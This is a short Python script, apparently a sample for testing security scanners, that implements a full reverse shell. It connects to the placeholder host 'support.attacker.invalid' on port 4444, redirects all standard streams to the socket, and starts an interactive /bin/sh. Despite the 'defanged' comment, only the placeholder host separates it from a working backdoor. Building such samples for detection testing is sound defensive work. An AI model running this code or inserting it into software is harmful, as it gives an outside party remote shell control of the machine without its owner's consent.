#!/usr/bin/env python3
# DO NOT RUN - defanged sample for scanner evaluation
import socket, subprocess, os

HOST, PORT = "support.attacker.invalid", 4444
s = socket.socket()
s.connect((HOST, PORT))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
